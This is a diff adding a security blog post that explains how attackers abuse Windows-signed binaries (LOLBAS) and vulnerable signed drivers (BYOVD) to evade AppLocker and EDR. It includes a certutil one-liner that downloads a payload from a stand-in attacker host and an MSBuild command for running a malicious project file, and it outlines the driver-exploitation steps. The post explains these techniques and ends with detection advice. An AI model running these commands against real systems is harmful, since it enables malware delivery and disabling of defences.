@@ -1,0 +1,77 @@
+---
+title: "Leveraging LOLBAS and LOLDrivers: Turning Windows Against Itself"
+author: Guru Brian
+pubDatetime: 2026-08-22T18:51:00.000Z
+slug: 
+featured: false
+tags:
+  - Windows Security
+  - LOLBAS
+  - LOLDrivers
+  - BYOVD
+  - Red Teaming
+description: "Discover how attackers bypass modern Windows defenses like AppLocker and EDRs using trusted native binaries (LOLBAS) and vulnerable signed drivers (BYOVD)."
+hideEditPost: false
+---
+
+When we look at Linux privilege escalation, we often rely on GTFOBins to weaponize native tools. But what happens when you are navigating a hardened Windows environment? 
+
+When you land a shell on a Windows machine, you face a different beast: Endpoint Detection and Response (EDR) sensors, AppLocker, and strict execution policies. If you try to upload a custom compiled `.exe` to bypass these defenses, you will likely be caught instantly. 
+
+To survive in a modern Windows environment, attackers use the exact same strategy as they do on Linux: they use the operating system’s own trusted tools against it. Welcome to the world of LOLBAS and LOLDrivers.
+
+
+## Table of contents
+
+## LOLBAS: The Windows "GTFOBins"
+
+**LOLBAS** stands for *Living Off The Land Binaries, Scripts, and Libraries*. Just like its Linux counterpart, the LOLBAS project catalogs every native, Microsoft-signed executable that can be used by an attacker to execute code, download payloads, bypass User Account Control (UAC), or evade application whitelisting.
+
+Because these binaries are cryptographically signed by Microsoft and native to the operating system, they are implicitly trusted by antivirus solutions.
+
+## Real-World LOLBAS Examples
+
+If you need to download a payload or execute malicious code without triggering alarms, you don't need a zero-day exploit. You just need a native developer or administrative tool.
+
+### 1. The `certutil.exe` Downloader
+
+`certutil` is a legitimate command-line program installed on Windows used to manage certificates. However, because it is designed to reach out to the internet to verify certificate chains, attackers frequently use it as a stealthy downloader to bypass network filters.
+
+```powershell
+certutil.exe -urlcache -split -f [http://attacker-server.com/payload.exe](http://attacker-server.com/payload.exe) C:\Temp\payload.exe
+```
+By running this, the trusted Microsoft binary reaches out and downloads your malware, often flying right under the radar of basic web proxies.
+
+### 2. The MSBuild.exe Execution Bypass
+
+Imagine a system where the administrator has deployed AppLocker to block all unapproved .exe files. If you try to run your malware, it gets blocked.
+
+Enter MSBuild.exe. This is a native part of the .NET framework used by developers to build applications. Attackers can write their malicious payload inside a simple XML project file (.csproj).
+
+```powershell
+MSBuild.exe C:\Temp\malicious_project.csproj
+```
+
+Because MSBuild.exe is a highly trusted, Microsoft-signed binary, AppLocker happily allows it to run. MSBuild reads the malicious XML file and executes the attacker's code directly into memory, completely bypassing the executable blocklist.
+
+## The Kernel Threat: LOLDrivers and BYOVD
+
+Living off the land isn't restricted to standard user space. When elite attackers—like ransomware operators—need to disable a heavily fortified EDR solution, they don't attack the security software directly. They go beneath it, straight to the Windows Kernel (Ring 0), using a technique called BYOVD (Bring Your Own Vulnerable Driver).
+
+A LOLDriver is a legitimate, cryptographically signed driver (often from hardware vendors for things like graphics cards, CPU temperature monitors, or video game anti-cheat systems) that contains a known, unpatched vulnerability.
+
+### How BYOVD Works:
+ * Drop: The attacker drops an old, perfectly legitimate driver (e.g., an outdated MSI Afterburner RTCore64.sys driver) onto the target machine.
+ * Load: Because the driver is legitimately signed by a known vendor, Windows Kernel Patch Protection (PatchGuard) and driver signature enforcement allow it to load directly into the kernel.
+ * Exploit: The attacker then exploits the known vulnerability inside that trusted driver to gain NT AUTHORITY\SYSTEM privileges, or to forcefully blind and terminate the EDR processes from the inside out.
+
+> [!TIP] Terminology Check:
+> 
+> **BYOVD** is the technique attackers use to load the driver, while **LOLDrivers** refers to the defense resource/catalog tracking these vulnerable files.
+
+## The Takeaway
+
+The ultimate irony of modern Windows security is that attackers no longer need to bring their own weapons—*they just use yours*.
+
+When threat actors can bypass AppLocker with native developer tools or blind EDRs with legitimate hardware drivers, traditional signature-based security is effectively dead. To defend against "Living off the Land" techniques, your mindset has to shift. You can no longer just hunt for malicious files; you must actively hunt for the malicious behavior of trusted tools.
+
